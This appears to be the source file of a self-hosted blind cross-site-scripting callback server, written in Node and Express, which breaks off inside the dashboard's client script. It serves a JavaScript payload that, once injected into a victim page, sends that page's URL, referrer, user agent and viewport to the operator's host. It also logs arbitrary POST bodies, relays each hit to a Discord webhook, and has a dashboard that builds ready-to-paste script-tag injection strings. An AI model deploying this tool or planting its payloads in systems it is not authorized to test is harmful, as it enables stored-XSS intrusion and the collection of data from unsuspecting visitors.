import express from "express";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 10000;
const publicBaseUrl = (process.env.PUBLIC_BASE_URL || `http://localhost:${PORT}`).replace(/\/$/, "");
const dataDir = process.env.DATA_DIR || __dirname;
fs.mkdirSync(dataDir, { recursive: true });
const logFile = path.join(dataDir, "callbacks.jsonl");
const dashboardUsername = process.env.DASHBOARD_USERNAME;
const dashboardPassword = process.env.DASHBOARD_PASSWORD;
const sessionSecret = process.env.SESSION_SECRET || dashboardPassword;
const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "";
const failedLogins = new Map();

app.disable("x-powered-by");
app.set("trust proxy", true);

app.use(express.json({ limit: "5mb", type: ["application/json", "application/*+json", "text/plain"] }));
app.use(express.urlencoded({ extended: false, limit: "16kb" }));

app.get("/", (_req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/login", (req, res) => {
  setPrivatePageHeaders(res);
  if (isAuthenticated(req)) {
    res.redirect("/dashboard");
    return;
  }

  res.type("html").send(buildLoginPage(Boolean(req.query.error)));
});

app.post("/login", (req, res) => {
  setPrivatePageHeaders(res);
  if (!dashboardUsername || !dashboardPassword || !sessionSecret) {
    res.status(500).type("html").send(buildLoginPage(true, "Dashboard credentials are not configured on the server."));
    return;
  }

  const ip = req.ip || "unknown";
  const attempts = failedLogins.get(ip) || { count: 0, resetAt: 0 };
  const now = Date.now();

  if (attempts.resetAt > now && attempts.count >= 8) {
    res.status(429).type("html").send(buildLoginPage(true, "Too many attempts. Try again shortly."));
    return;
  }

  if (!safeEqual(String(req.body.username || ""), dashboardUsername) ||
      !safeEqual(String(req.body.password || ""), dashboardPassword)) {
    failedLogins.set(ip, {
      count: attempts.resetAt > now ? attempts.count + 1 : 1,
      resetAt: now + 10 * 60 * 1000
    });
    res.redirect("/login?error=1");
    return;
  }

  failedLogins.delete(ip);
  setAuthCookie(res);
  res.redirect("/dashboard");
});

app.post("/logout", (_req, res) => {
  setPrivatePageHeaders(res);
  res.setHeader("Set-Cookie", buildCookie("xssdash", "", { maxAge: 0 }));
  res.redirect("/login");
});

app.get("/dashboard", requireAuth, (_req, res) => {
  res.type("html").send(buildDashboard(publicBaseUrl));
});

app.get("/api/callbacks", requireAuth, (_req, res) => {
  res.json({
    callbacks: readCallbacks(null).reverse()
  });
});

app.post("/api/callbacks/clear", requireAuth, (_req, res) => {
  fs.writeFileSync(logFile, "", "utf8");
  res.json({ ok: true, callbacks: [] });
});

app.get("/api/callbacks/download", requireAuth, (_req, res) => {
  res.set({
    "Content-Type": "application/x-ndjson; charset=utf-8",
    "Content-Disposition": 'attachment; filename="callbacks.jsonl"'
  });

  if (!fs.existsSync(logFile)) {
    res.send("");
    return;
  }

  res.sendFile(logFile);
});

app.post("/api/callbacks/import", requireAuth, (req, res) => {
  const entries = Array.isArray(req.body.entries) ? req.body.entries.slice(0, 5000) : [];
  const normalized = entries.map(normalizeImportedEntry).filter(Boolean);

  if (normalized.length) {
    fs.appendFileSync(logFile, normalized.map((entry) => JSON.stringify(entry)).join("\n") + "\n", "utf8");
  }

  res.json({ ok: true, imported: normalized.length, callbacks: readCallbacks(null).reverse() });
});

app.post("/api/callbacks/delete-page", requireAuth, (req, res) => {
  const pageKey = String(req.body.pageKey || "");
  const remaining = readCallbacks(null).filter((entry) => pageKeyForEntry(entry) !== pageKey);
  fs.writeFileSync(logFile, remaining.map((entry) => JSON.stringify(entry)).join("\n") + (remaining.length ? "\n" : ""), "utf8");
  res.json({ ok: true, callbacks: remaining.reverse() });
});

app.post("/api/callbacks/move-page", requireAuth, (req, res) => {
  const sourcePageKey = String(req.body.sourcePageKey || "");
  const targetPageKey = String(req.body.targetPageKey || "");

  if (!sourcePageKey || !targetPageKey || sourcePageKey === targetPageKey) {
    res.status(400).json({ error: "invalid_page_move" });
    return;
  }

  const updated = readCallbacks(null).map((entry) => {
    if (pageKeyForEntry(entry) !== sourcePageKey) {
      return entry;
    }

    return {
      ...entry,
      pageUrl: targetPageKey === "Unknown page" ? "" : targetPageKey,
      referrer: targetPageKey === "Unknown page" ? "" : entry.referrer
    };
  });

  fs.writeFileSync(logFile, updated.map((entry) => JSON.stringify(entry)).join("\n") + (updated.length ? "\n" : ""), "utf8");
  res.json({ ok: true, callbacks: updated.reverse() });
});

app.get("/health", (_req, res) => {
  res.json({
    ok: true,
    publicBaseUrl,
    callbackCount: readCallbacks(null).length,
    authConfigured: Boolean(dashboardUsername && dashboardPassword && sessionSecret),
    hasDashboardUsername: Boolean(dashboardUsername),
    hasDashboardPassword: Boolean(dashboardPassword),
    hasSessionSecret: Boolean(sessionSecret)
  });
});

app.post("/callback", (req, res) => {
  const body = parseBody(req.body);
  writeCallback({
    ip: req.ip,
    marker: cleanString(body.marker),
    pageUrl: cleanString(body.pageUrl),
    referrer: cleanString(body.referrer),
    userAgent: cleanString(body.userAgent),
    language: cleanString(body.language),
    viewport: cleanString(body.viewport),
    source: "script"
  });

  res.status(204).end();
});

app.get("/i/:marker.gif", (req, res) => {
  writeCallback({
    ip: req.ip,
    marker: cleanString(req.params.marker),
    pageUrl: cleanString(req.query.u || req.query.url || ""),
    referrer: cleanString(req.query.r || req.get("referer") || ""),
    userAgent: cleanString(req.get("user-agent") || ""),
    language: cleanString(req.get("accept-language") || ""),
    viewport: "",
    source: "image"
  });

  res.set({
    "Content-Type": "image/gif",
    "Cache-Control": "no-store, max-age=0"
  });
  res.send(Buffer.from("R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==", "base64"));
});

app.get("/x/*", (req, res) => {
  writeCallback({
    ip: req.ip,
    marker: markerFromPath(req.params[0]),
    pageUrl: "",
    referrer: cleanString(req.get("referer") || ""),
    userAgent: cleanString(req.get("user-agent") || ""),
    language: cleanString(req.get("accept-language") || ""),
    viewport: "",
    source: "payload-load"
  });

  res.set({
    "Content-Type": "application/javascript; charset=utf-8",
    "Cache-Control": "no-store, max-age=0",
    "X-Content-Type-Options": "nosniff"
  });

  res.send(buildPayload(publicBaseUrl, req.params[0]));
});

app.post("/x/*", captureRawBody, (req, res) => {
  writeCallback({
    ip: req.ip,
    marker: markerFromPath(req.params[0]),
    pageUrl: "",
    referrer: cleanString(req.get("referer") || ""),
    userAgent: cleanString(req.get("user-agent") || ""),
    language: cleanString(req.get("accept-language") || ""),
    viewport: "",
    rawBody: cleanString(req.rawBody || ""),
    source: "payload-post"
  });

  res.status(204).end();
});

app.use((_req, res) => {
  res.status(404).type("text").send("Not found");
});

app.listen(PORT, () => {
  console.log(`Blind XSS server listening on http://localhost:${PORT}`);
  console.log(`Example payload: <script src="${publicBaseUrl}/x/blind-xss"></script>`);
});

function captureRawBody(req, res, next) {
  // If express.json()/express.urlencoded() already parsed a matching
  // Content-Type, reuse that instead of trying to read the stream again.
  if (req.body && typeof req.body === "object" && Object.keys(req.body).length) {
    req.rawBody = JSON.stringify(req.body);
    next();
    return;
  }
  if (typeof req.body === "string" && req.body.length) {
    req.rawBody = req.body;
    next();
    return;
  }

  // Otherwise (e.g. a PDF SubmitForm sending application/vnd.fdf, or any
  // other content type the global parsers ignore) read the raw bytes so we
  // can still log what was actually sent.
  let data = "";
  req.setEncoding("utf8");
  req.on("data", (chunk) => {
    data += chunk;
    if (data.length > 1_000_000) {
      req.destroy();
    }
  });
  req.on("end", () => {
    req.rawBody = data;
    next();
  });
  req.on("error", () => {
    req.rawBody = "";
    next();
  });
}

function cleanString(value) {
  if (typeof value !== "string") {
    return "";
  }

  return value.slice(0, 2000);
}

function requireAuth(req, res, next) {
  setPrivatePageHeaders(res);
  if (isAuthenticated(req)) {
    next();
    return;
  }

  if (req.path.startsWith("/api/")) {
    res.status(401).json({ error: "auth_required" });
    return;
  }

  res.redirect("/login");
}

function setPrivatePageHeaders(res) {
  res.set({
    "Cache-Control": "no-store, max-age=0",
    "Pragma": "no-cache",
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "no-referrer"
  });
}

function isAuthenticated(req) {
  if (!dashboardUsername || !dashboardPassword || !sessionSecret) {
    return false;
  }

  const cookies = parseCookies(req.get("cookie") || "");
  const token = cookies.xssdash;
  if (!token) {
    return false;
  }

  const [payload, signature] = token.split(".");
  if (!payload || !signature) {
    return false;
  }

  const expected = signValue(payload);
  if (!safeEqual(signature, expected)) {
    return false;
  }

  try {
    const session = JSON.parse(Buffer.from(payload, "base64url").toString("utf8"));
    return Number(session.exp) > Date.now();
  } catch {
    return false;
  }
}

function setAuthCookie(res) {
  const payload = Buffer.from(JSON.stringify({
    exp: Date.now() + 12 * 60 * 60 * 1000,
    nonce: crypto.randomBytes(16).toString("hex")
  })).toString("base64url");
  res.setHeader("Set-Cookie", buildCookie("xssdash", `${payload}.${signValue(payload)}`, { maxAge: 12 * 60 * 60 }));
}

function buildCookie(name, value, options = {}) {
  const parts = [
    `${name}=${encodeURIComponent(value)}`,
    "Path=/",
    "HttpOnly",
    "SameSite=Lax"
  ];

  if (options.maxAge !== undefined) {
    parts.push(`Max-Age=${options.maxAge}`);
  }

  if (process.env.NODE_ENV === "production" || publicBaseUrl.startsWith("https://")) {
    parts.push("Secure");
  }

  return parts.join("; ");
}

function parseCookies(header) {
  return header.split(";").reduce((cookies, part) => {
    const index = part.indexOf("=");
    if (index === -1) {
      return cookies;
    }

    const key = part.slice(0, index).trim();
    const value = part.slice(index + 1).trim();
    cookies[key] = decodeURIComponent(value);
    return cookies;
  }, {});
}

function signValue(value) {
  return crypto.createHmac("sha256", sessionSecret).update(value).digest("base64url");
}

function safeEqual(left, right) {
  const leftBuffer = Buffer.from(String(left));
  const rightBuffer = Buffer.from(String(right));
  if (leftBuffer.length !== rightBuffer.length) {
    return false;
  }

  return crypto.timingSafeEqual(leftBuffer, rightBuffer);
}

function parseBody(body) {
  if (typeof body === "string") {
    try {
      return JSON.parse(body);
    } catch {
      return {};
    }
  }

  if (body && typeof body === "object") {
    return body;
  }

  return {};
}

function writeCallback(entry) {
  const normalized = {
    receivedAt: new Date().toISOString(),
    ip: entry.ip || "",
    marker: entry.marker || "unknown",
    pageUrl: entry.pageUrl || "",
    referrer: entry.referrer || "",
    userAgent: entry.userAgent || "",
    language: entry.language || "",
    viewport: entry.viewport || "",
    rawBody: entry.rawBody || "",
    source: entry.source || "unknown"
  };

  fs.appendFileSync(logFile, `${JSON.stringify(normalized)}\n`, "utf8");
  console.log("Blind XSS callback:", normalized);
  notifyDiscord(normalized);
}

// Discord embed field values are capped at 1024 chars each.
const DISCORD_FIELD_LIMIT = 1024;

function notifyDiscord(entry) {
  if (!discordWebhookUrl) {
    return;
  }

  const page = entry.pageUrl || entry.referrer || "Unknown page";
  const hitId = entry.receivedAt ? entry.receivedAt.replace(/[^a-zA-Z0-9]/g, "-") : "latest";
  const dashboardField = { name: "Open in dashboard", value: `${publicBaseUrl}/dashboard#hit=${hitId}`, inline: false };
  const baseFields = [
    { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
    { name: "Source", value: truncateDiscord(entry.source), inline: true },
    { name: "IP", value: truncateDiscord(entry.ip || "Unknown"), inline: true },
    { name: "Page", value: truncateDiscord(page), inline: false },
    { name: "User Agent", value: truncateDiscord(entry.userAgent || "Unknown"), inline: false }
  ];

  const rawBody = String(entry.rawBody || "");

  if (!rawBody) {
    sendDiscordEmbed([...baseFields, dashboardField], entry.receivedAt, "New Blind XSS Hit");
    return;
  }

  if (rawBody.length <= DISCORD_FIELD_LIMIT) {
    sendDiscordEmbed(
      [...baseFields, { name: "Body", value: rawBody, inline: false }, dashboardField],
      entry.receivedAt,
      "New Blind XSS Hit"
    );
    return;
  }

  // Body doesn't fit in a single field/message — send it across two messages
  // instead of silently truncating it.
  const firstHalf = rawBody.slice(0, DISCORD_FIELD_LIMIT);
  const secondHalf = rawBody.slice(DISCORD_FIELD_LIMIT, DISCORD_FIELD_LIMIT * 2);

  sendDiscordEmbed(
    [...baseFields, { name: "Body (1/2)", value: firstHalf, inline: false }],
    entry.receivedAt,
    "New Blind XSS Hit"
  );

  sendDiscordEmbed(
    [
      { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
      { name: "Body (2/2)", value: truncateDiscord(secondHalf), inline: false },
      dashboardField
    ],
    entry.receivedAt,
    "New Blind XSS Hit (continued)"
  );
}

function sendDiscordEmbed(fields, timestamp, title) {
  fetch(discordWebhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "Blind XSS Monitor",
      embeds: [{
        title,
        color: 2140567,
        timestamp,
        fields
      }]
    })
  }).catch((error) => {
    console.error("Discord notification failed:", error.message);
  });
}

function truncateDiscord(value) {
  const text = String(value || "");
  return text.length > 1000 ? `${text.slice(0, 997)}...` : text;
}

function normalizeImportedEntry(entry) {
  if (!entry || typeof entry !== "object") {
    return null;
  }

  const receivedAt = cleanString(entry.receivedAt);
  return {
    receivedAt: Number.isNaN(new Date(receivedAt).getTime()) ? new Date().toISOString() : receivedAt,
    ip: cleanString(entry.ip),
    marker: cleanString(entry.marker) || "unknown",
    pageUrl: cleanString(entry.pageUrl),
    referrer: cleanString(entry.referrer),
    userAgent: cleanString(entry.userAgent),
    language: cleanString(entry.language),
    viewport: cleanString(entry.viewport),
    rawBody: cleanString(entry.rawBody),
    source: cleanString(entry.source) || "import"
  };
}

function buildPayload(baseUrl, markerPath) {
  const callbackUrl = JSON.stringify(`${baseUrl}/callback`);
  const imageBaseUrl = JSON.stringify(`${baseUrl}/i/`);
  const marker = JSON.stringify(markerFromPath(markerPath));

  return `(() => {
  "use strict";

  const payload = {
    marker: ${marker},
    pageUrl: String(location.href),
    referrer: String(document.referrer || ""),
    userAgent: String(navigator.userAgent || ""),
    language: String(navigator.language || ""),
    viewport: String(window.innerWidth || "") + "x" + String(window.innerHeight || "")
  };

  const body = JSON.stringify(payload);

  try {
    if (navigator.sendBeacon) {
      const blob = new Blob([body], { type: "application/json" });
      if (navigator.sendBeacon(${callbackUrl}, blob)) {
        return;
      }
    }
  } catch (_) {}

  try {
    fetch(${callbackUrl}, {
      method: "POST",
      mode: "no-cors",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      body
    }).catch(() => {});
  } catch (_) {}

  try {
    const image = new Image();
    image.src = ${imageBaseUrl} + encodeURIComponent(payload.marker) + ".gif?u=" +
      encodeURIComponent(payload.pageUrl) + "&r=" + encodeURIComponent(payload.referrer) +
      "&t=" + Date.now();
  } catch (_) {}
})();`;
}

function markerFromPath(markerPath) {
  return String(markerPath || "").replace(/^\/+/, "").replace(/\/+$/, "") || "blind-xss";
}

function pageKeyForEntry(entry) {
  return String(entry.pageUrl || entry.referrer || "Unknown page");
}

function readCallbacks(limit = 500) {
  if (!fs.existsSync(logFile)) {
    return [];
  }

  const callbacks = fs.readFileSync(logFile, "utf8")
    .split(/\r?\n/)
    .filter(Boolean)
    .map((line) => {
      try {
        return JSON.parse(line);
      } catch {
        return null;
      }
    })
    .filter(Boolean);

  return limit === null ? callbacks : callbacks.slice(-limit);
}

function buildLoginPage(hasError = false, message = "Invalid password.") {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dashboard Login</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #101214;
      --panel: #171b1f;
      --panel-2: #20262b;
      --text: #edf2f7;
      --muted: #9aa7b2;
      --line: #303941;
      --accent: #20c997;
      --danger: #ff6b6b;
    }
    * { box-sizing: border-box; }
    body {
      min-height: 100vh;
      margin: 0;
      display: grid;
      place-items: center;
      padding: 20px;
      background: var(--bg);
      color: var(--text);
      font: 14px/1.5 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }
    form {
      width: min(420px, 100%);
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 8px;
      padding: 22px;
      display: grid;
      gap: 14px;
    }
    h1 { margin: 0; font-size: 20px; }
    p { margin: 0; color: var(--muted); }
    label { color: var(--muted); }
    input, button {
      min-height: 42px;
      border-radius: 6px;
      border: 1px solid var(--line);
      background: var(--panel-2);
      color: var(--text);
      font: inherit;
      padding: 9px 11px;
    }
    button {
      cursor: pointer;
      background: var(--accent);
      color: #07110e;
      border-color: var(--accent);
      font-weight: 700;
    }
    .error {
      border: 1px solid rgba(255, 107, 107, 0.5);
      background: rgba(255, 107, 107, 0.12);
      color: var(--danger);
      border-radius: 6px;
      padding: 9px 11px;
    }
  </style>
</head>
<body>
  <form method="post" action="/login" autocomplete="off">
    <h1>Blind XSS Dashboard</h1>
    <p>Enter the dashboard password to continue.</p>
    ${hasError ? `<div class="error">${escapeHtml(message)}</div>` : ""}
    <label for="username">Username</label>
    <input id="username" name="username" type="text" autocomplete="username" autofocus required>
    <label for="password">Password</label>
    <input id="password" name="password" type="password" autocomplete="current-password" required>
    <button type="submit">Login</button>
  </form>
</body>
</html>`;
}

function buildDashboard(baseUrl) {
  const samplePayload = `<script src="${baseUrl}/x/blind-xss"></script>"/><script src="${baseUrl}/x/blind-xss1"></script>`;

  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Blind XSS Dashboard</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #101214;
      --panel: #171b1f;
      --panel-2: #20262b;
      --text: #edf2f7;
      --muted: #9aa7b2;
      --line: #303941;
      --accent: #20c997;
      --warn: #f7b955;
      --danger: #ff6b6b;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font: 14px/1.5 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    header {
      border-bottom: 1px solid var(--line);
      background: #15191d;
      padding: 18px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 18px;
    }

    h1 {
      margin: 0;
      font-size: 20px;
      font-weight: 650;
    }

    main {
      padding: 24px;
      display: grid;
      gap: 18px;
    }

    .top {
      display: grid;
      grid-template-columns: minmax(280px, 1fr) 340px;
      gap: 18px;
    }

    .split {
      display: grid;
      grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
      gap: 18px;
      align-items: stretch;
    }

    .split .panel {
      height: 100%;
    }

    .panel {
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 8px;
      overflow: visible;
    }

    .panel-header {
      padding: 14px 16px;
      border-bottom: 1px solid var(--line);
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
    }

    .panel-header h2 {
      margin: 0;
      font-size: 14px;
      font-weight: 650;
    }

    .panel-body {
      padding: 16px;
    }

    .payload-row {
      display: grid;
      grid-template-columns: 1fr auto;
      gap: 8px;
      margin-top: 10px;
    }

    input, button {
      border: 1px solid var(--line);
      background: var(--panel-2);
      color: var(--text);
      border-radius: 6px;
      font: inherit;
      min-height: 38px;
    }

    input {
      width: 100%;
      padding: 8px 10px;
      min-width: 0;
    }

    button {
      cursor: pointer;
      padding: 8px 12px;
    }

    button:hover {
      border-color: var(--accent);
    }

    .ghost {
      background: transparent;
    }

    .danger {
      color: var(--danger);
    }

    .header-actions {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .header-actions form {
      margin: 0;
    }

    code {
      display: block;
      overflow-x: auto;
      padding: 12px;
      border-radius: 6px;
      background: #0b0d0f;
      border: 1px solid var(--line);
      white-space: nowrap;
    }

    .stats {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .stat {
      background: var(--panel-2);
      border: 1px solid var(--line);
      border-radius: 8px;
      padding: 12px;
    }

    .stat strong {
      display: block;
      font-size: 24px;
      line-height: 1.1;
    }

    .stat span {
      color: var(--muted);
      font-size: 12px;
    }

    .status {
      color: var(--muted);
      font-size: 12px;
    }

    .filters {
      display: grid;
      grid-template-columns: repeat(3, minmax(0, 1fr));
      gap: 10px;
    }

    .import-row {
      display: grid;
      grid-template-columns: minmax(0, 1fr) auto;
      gap: 10px;
      align-items: center;
    }

    .modal-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.6);
      z-index: 2000;
      align-items: center;
      justify-content: center;
    }
    .modal-overlay.open { display: flex; }
    .modal {
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 10px;
      width: min(520px, 95vw);
      box-shadow: 0 24px 48px rgba(0,0,0,0.5);
      overflow: hidden;
    }
    .modal-header {
      padding: 14px 16px;
      border-bottom: 1px solid var(--line);
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .modal-header h2 { margin: 0; font-size: 14px; font-weight: 650; }
    .modal-body { padding: 16px; display: grid; gap: 12px; }
    .modal-close {
      background: transparent;
      border: 0;
      color: var(--muted);
      font-size: 20px;
      line-height: 1;
      min-height: auto;
      padding: 2px 6px;
      cursor: pointer;
    }
    .modal-close:hover { color: var(--text); border-color: transparent; }

    .groups {
      display: grid;
      gap: 10px;
      padding: 12px;
      overflow: visible;
    }

    .group-card {
      position: relative;
      z-index: 1;
      width: 100%;
      display: grid;
      grid-template-columns: minmax(0, 1fr) auto auto;
      gap: 10px;
      align-items: center;
      padding: 12px;
      background: var(--panel-2);
      border: 1px solid var(--line);
      border-radius: 8px;
    }

    .group-card.active {
      border-color: var(--accent);
    }

    .group-card.menu-active {
      z-index: 500;
    }

    .group-main {
      min-height: auto;
      padding: 0;
      border: 0;
      background: transparent;
      text-align: left;
    }

    .group-title {
      font-weight: 650;
      overflow-wrap: anywhere;
    }

    .group-meta {
      display: block;
      color: var(--muted);
      font-size: 12px;
      margin-top: 3px;
    }

    .hit-count {
      color: var(--accent);
      font-size: 20px;
      font-weight: 750;
      white-space: nowrap;
    }

    .icon-button {
      width: 36px;
      min-height: 36px;
      padding: 0;
      font-size: 20px;
      line-height: 1;
    }

    .menu {
      position: absolute;
      right: 10px;
      top: 48px;
      z-index: 1000;
      min-width: 150px;
      display: none;
      padding: 6px;
      background: #111519;
      border: 1px solid var(--line);
      border-radius: 8px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
    }

    .menu.align-up {
      top: auto;
      bottom: 48px;
    }

    .menu.open {
      display: grid;
      gap: 4px;
    }

    .menu button {
      min-height: 34px;
      text-align: left;
      background: transparent;
      border: 0;
      padding: 7px 9px;
    }

    .menu button:hover {
      background: var(--panel-2);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      table-layout: fixed;
    }

    th, td {
      border-bottom: 1px solid var(--line);
      padding: 10px 12px;
      text-align: left;
      vertical-align: top;
    }

    th {
      color: var(--muted);
      font-size: 12px;
      font-weight: 650;
      background: #14181b;
    }

    td {
      overflow-wrap: anywhere;
    }

    .marker {
      color: var(--accent);
      font-weight: 650;
    }

    .muted {
      color: var(--muted);
    }

    .empty {
      padding: 28px;
      color: var(--muted);
      text-align: center;
    }

    .pill {
      display: inline-flex;
      align-items: center;
      min-height: 26px;
      padding: 3px 8px;
      border: 1px solid var(--line);
      border-radius: 999px;
      color: var(--muted);
      background: var(--panel-2);
      font-size: 12px;
    }

    @media (max-width: 860px) {
      header { align-items: flex-start; flex-direction: column; }
      main { padding: 14px; }
      .top { grid-template-columns: 1fr; }
      .split { grid-template-columns: 1fr; }
      .filters { grid-template-columns: 1fr; }
      .payload-row { grid-template-columns: 1fr; }
      th:nth-child(4), td:nth-child(4), th:nth-child(5), td:nth-child(5) { display: none; }
      th:nth-child(6), td:nth-child(6) { max-width: 160px; }
    }
  </style>
</head>
<body>
  <header>
    <div>
      <h1>Blind XSS Dashboard</h1>
      <div class="status">Serving payloads from <span id="base-url">${escapeHtml(baseUrl)}</span></div>
    </div>
    <div class="header-actions">
      <span class="pill" id="last-refresh">Waiting for callbacks</span>
      <button class="ghost" id="open-filters">⚙ Filter</button>
      <button class="ghost" id="open-import">⬆ Import / Export</button>
      <form method="post" action="/logout">
        <button class="ghost" type="submit">Logout</button>
      </form>
    </div>
  </header>

  <main>
    <section class="top">
      <div class="panel">
        <div class="panel-header">
          <h2>Payload Builder</h2>
        </div>
        <div class="panel-body">
          <label for="marker">Unique marker</label>
          <div class="payload-row">
            <input id="marker" value="blind-xss" spellcheck="false">
            <button id="copy">Copy payload</button>
          </div>
          <p class="muted">Use a different marker for each test location so the callback tells you where it came from.</p>
          <code id="payload">${escapeHtml(samplePayload)}</code>
        </div>
      </div>

      <div class="panel">
        <div class="panel-header">
          <h2>Summary</h2>
        </div>
        <div class="panel-body stats">
          <div class="stat">
            <strong id="total">0</strong>
            <span>Total hits</span>
          </div>
          <div class="stat">
            <strong id="unique">0</strong>
            <span>Unique markers</span>
          </div>
        </div>
      </div>
    </section>

    <!-- Filter Modal -->
    <div class="modal-overlay" id="modal-filters">
      <div class="modal">
        <div class="modal-header">
          <h2>Filters</h2>
          <div style="display:flex;gap:8px;align-items:center">
            <button id="clear-filters">Clear</button>
            <button class="modal-close" id="close-filters">✕</button>
          </div>
        </div>
        <div class="modal-body filters">
          <input id="filter-page" placeholder="Filter page URL or site" list="page-suggestions">
          <datalist id="page-suggestions"></datalist>
          <input id="filter-ip" placeholder="Filter IP" list="ip-suggestions">
          <datalist id="ip-suggestions"></datalist>
          <input id="filter-marker" placeholder="Filter marker" list="marker-suggestions">
          <datalist id="marker-suggestions"></datalist>
        </div>
      </div>
    </div>

    <!-- Import / Export Modal -->
    <div class="modal-overlay" id="modal-import">
      <div class="modal">
        <div class="modal-header">
          <h2>Import / Export</h2>
          <button class="modal-close" id="close-import">✕</button>
        </div>
        <div class="modal-body">
          <button id="download-hits">Download hits</button>
          <div class="import-row">
            <input id="import-file" type="file" accept=".jsonl,.json,application/json,application/x-ndjson">
            <button id="append-import">Add to logs</button>
          </div>
          <div id="import-preview" class="muted empty">No import file selected.</div>
        </div>
      </div>
    </div>

    <section class="panel">
      <div class="panel-header">
        <h2>Pages</h2>
        <div class="header-actions">
          <button id="refresh">Refresh</button>
          <button id="clear-all" class="danger">Clear all</button>
        </div>
      </div>
      <div id="groups" class="groups"></div>
    </section>

    <section class="panel">
      <div class="panel-header">
        <h2 id="details-title">Hit Details</h2>
      </div>
      <div id="callbacks"></div>
    </section>
  </main>

  <script>
    const baseUrl = ${JSON.stringify(baseUrl)};
    const markerInput = document.querySelector("#marker");
    const payloadCode = document.querySelector("#payload");
    const groupsEl = document.querySelector("#groups");
    const callbacksEl = document.querySelector("#callbacks");
    const detailsTitleEl = document.querySelector("#details-title");
    const pageSuggestionsEl = document.querySelector("#page-suggestions");
    const ipSuggestionsEl = document.querySelector("#ip-suggestions");
    const markerSuggestionsEl = document.querySelector("#marker-suggestions");
    const importFileEl = document.querySelector("#import-file");
    const importPreviewEl = document.querySelector("#import-preview");
    const totalEl = document.querySelector("#total");
    const uniqueEl = document.querySelector("#unique");
    const refreshEl = document.querySelector("#last-refresh");
    const filters = {
      page: document.querySelector("#filter-page"),
      ip: document.querySelector("#filter-ip"),
      marker: document.querySelector("#filter-marker")
    };
    let allCallbacks = [];
    let activeGroupKey = "";
    let cutPageKey = "";
    let importPreviewEntries = [];

    function payloadForMarker(marker) {
      const clean = marker.replace(/^\\/+/, "").trim() || "blind-xss";
      return '<script src="' + baseUrl + '/x/' + clean + '"></' + 'script>"/><script src="' +
        baseUrl + '/x/' + clean + '1"></' + 'script>';
    }

    function updatePayload() {
      payloadCode.textContent = payloadForMarker(markerInput.value);
    }

    markerInput.addEventListener("input", updatePayload);
    document.querySelector("#copy").addEventListener("click", async () => {
      updatePayload();
      await navigator.clipboard.writeText(payloadCode.textContent);
    });
    document.querySelector("#refresh").addEventListener("click", loadCallbacks);
    document.querySelector("#download-hits").addEventListener("click", () => {
      location.href = "/api/callbacks/download";
    });
    document.querySelector("#append-import").addEventListener("click", appendImportFile);
    importFileEl.addEventListener("change", async () => {
      importPreviewEntries = [];
      await previewImportFile();
    });
    document.querySelector("#clear-all").addEventListener("click", async () => {
      if (!confirm("Clear all dashboard hits?")) {
        return;
      }

      const data = await postJson("/api/callbacks/clear", {});
      allCallbacks = data.callbacks || [];
      activeGroupKey = "";
      renderCallbacks(allCallbacks);
      updateSuggestions(allCallbacks);
    });
    document.querySelector("#clear-filters").addEventListener("click", () => {
      Object.values(filters).forEach((input) => {
        input.value = "";
      });
      activeGroupKey = "";
      renderCallbacks(allCallbacks);
    });
    Object.values(filters).forEach((input) => {
      input.addEventListener("input", () => renderCallbacks(allCallbacks));
    });
    document.addEventListener("click", (event) => {
      if (!event.target.closest(".group-card")) {
        closeMenus();
      }
    });

    // Modal open/close
    function openModal(id) { document.getElementById(id).classList.add("open"); }
    function closeModal(id) { document.getElementById(id).classList.remove("open"); }
    document.querySelector("#open-filters").addEventListener("click", () => openModal("modal-filters"));
    document.querySelector("#close-filters").addEventListener("click", () => closeModal("modal-filters"));
    document.querySelector("#modal-filters").addEventListener("click", (e) => { if (e.target === e.currentTarget) closeModal("modal-filters"); });
    document.querySelector("#open-import").addEventListener("click", () => openModal("modal-import"));
    document.querySelector("#close-import").addEventListener("click", () => closeModal("modal-import"));
    document.querySelector("#modal-import").addEventListener("click", (e) => { if (e.target === e.currentTarget) closeModal("modal-import"); });
    document.addEventListener("keydown", (e) => { if (e.key === "Escape") { closeModal("modal-filters"); closeModal("modal-import"); } });

    async function loadCallbacks() {
      const response = await fetch("/api/callbacks", { cache: "no-store" });
      if (response.status === 401) {
        location.href = "/login";
        return;
      }
      const data = await response.json();
      allCallbacks = data.callbacks || [];
      renderCallbacks(allCallbacks);
      updateSuggestions(allCallbacks);
      refreshEl.textContent = "Last refresh " + new Date().toLocaleTimeString();
    }

    async function postJson(url, body) {
